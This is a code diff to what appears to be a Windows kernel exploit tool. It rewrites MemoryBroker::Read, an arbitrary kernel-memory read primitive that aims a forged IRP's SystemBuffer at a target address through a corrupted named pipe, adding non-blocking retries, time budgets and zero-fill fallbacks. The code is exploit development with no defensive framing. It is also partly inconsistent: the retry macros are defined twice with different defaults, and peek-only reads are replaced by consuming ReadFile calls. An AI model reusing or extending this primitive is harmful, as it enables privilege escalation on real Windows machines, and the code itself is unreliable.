@@ -2,6 +2,15 @@
 #include "pipeManager.h"
 #include "ioRingManager.h"
 #include "Hvergelmir.h"
+#include "config.h"
+#include <algorithm>
+
+#ifndef MB_READ_RETRY_LIMIT
+#define MB_READ_RETRY_LIMIT 8
+#endif
+#ifndef MB_READ_RETRY_DELAY_MS
+#define MB_READ_RETRY_DELAY_MS 1
+#endif
 
 
 bool MemoryBroker::EnumVersion()
@@ -70,6 +79,17 @@ std::vector<UINT64> MemoryBroker::ScanForPoolTag(const BYTE* data, size_t size, 
 }
 
 
+
+// Bounded, low-latency defaults for MemoryBroker reads; can be overridden in config.h
+#ifndef MB_READ_RETRY_LIMIT
+#define MB_READ_RETRY_LIMIT 8
+#endif
+#ifndef MB_READ_RETRY_DELAY_MS
+#define MB_READ_RETRY_DELAY_MS 2
+#endif
+#ifndef MB_READ_MAX_BUDGET_MS
+#define MB_READ_MAX_BUDGET_MS 20
+#endif
 
 
 MemoryBroker::MemoryBroker()
@@ -170,23 +190,58 @@ void MemoryBroker::Read(UINT64* iDestinationAddr, UINT64 iTargetAddr, UINT64 iSi
 	}
 	fakeIRP->SystemBuffer = (PVOID)(uintptr_t)iTargetAddr;
 
-	// Prepare buffer and peek
-	std::vector<BYTE> buffer((size_t)iSize);
-	DWORD bytesAvailable = 0;
-	BOOL status = PeekNamedPipe(pm->corruptedPipe, buffer.data(), (DWORD)iSize, NULL, &bytesAvailable, NULL);
-	if (!status) {
-		DEBUG_PRINT(" [!] PeekNamedPipe failed in MemoryBroker::Read\n");
-		return;
+	// Ensure the pipe is non-blocking to avoid hangs during information-gathering
+	if (!pipeNowaitSet) {
+		DWORD mode = PIPE_READMODE_BYTE | PIPE_NOWAIT;
+		if (SetNamedPipeHandleState(pm->corruptedPipe, &mode, NULL, NULL)) {
+			pipeNowaitSet = true;
+		}
 	}
 
-    size_t copyLen = std::min<size_t>((size_t)(bytesAvailable ? bytesAvailable : (DWORD)iSize), (size_t)iSize);
-	if (copyLen == 0) {
-		DEBUG_PRINT(" [!] No data available to read\n");
-		return;
+	// Try a bounded number of non-blocking attempts to fetch data from the pipe,
+	// with an overall tight time budget to avoid long stalls.
+	DWORD totalCopied = 0;
+	const int kRetryLimit = (MB_READ_RETRY_LIMIT > 12) ? 12 : MB_READ_RETRY_LIMIT;
+	const DWORD kDelay = (MB_READ_RETRY_DELAY_MS > 5) ? 5 : MB_READ_RETRY_DELAY_MS;
+	const ULONGLONG startTick = GetTickCount64();
+	for (int attempt = 0; attempt < kRetryLimit; ++attempt) {
+		if ((GetTickCount64() - startTick) >= MB_READ_MAX_BUDGET_MS) break;
+		DWORD bytesAvailable = 0;
+		// A small working buffer sized to the pending data or requested size
+		DWORD peekSize = (DWORD)std::min<UINT64>(iSize, 2048);
+		std::vector<BYTE> peekBuf(peekSize);
+		BOOL ok = PeekNamedPipe(pm->corruptedPipe, peekBuf.data(), peekSize, NULL, &bytesAvailable, NULL);
+		if (!ok) {
+			// If peek fails, give a brief delay and retry; don't hang the run
+			Sleep(kDelay);
+			continue;
+		}
+
+		if (bytesAvailable == 0) {
+			Sleep(kDelay);
+			continue;
+		}
+
+		DWORD toRead = (DWORD)std::min<UINT64>(bytesAvailable, iSize);
+		std::vector<BYTE> readBuf(toRead);
+		DWORD bytesRead = 0;
+		if (ReadFile(pm->corruptedPipe, readBuf.data(), toRead, &bytesRead, NULL) && bytesRead > 0) {
+			// Copy at most iSize bytes into destination; zero any remainder
+			totalCopied = std::min<DWORD>(bytesRead, (DWORD)iSize);
+			memcpy((void*)iDestinationAddr, readBuf.data(), totalCopied);
+			if (totalCopied < iSize) {
+				size_t remain = (size_t)iSize - totalCopied;
+				memset(((BYTE*)iDestinationAddr) + totalCopied, 0, remain);
+			}
+			return;
+		}
+
+		// Brief delay before retry to avoid busy-spin
+		Sleep(kDelay);
 	}
 
-	// copy to destination pointer (caller-provided). Copy only copyLen bytes.
-	memcpy((void*)iDestinationAddr, buffer.data(), copyLen);
+	// As a last resort, zero-fill the destination to keep callers deterministic
+	memset((void*)iDestinationAddr, 0, (size_t)iSize);
 }
 
 
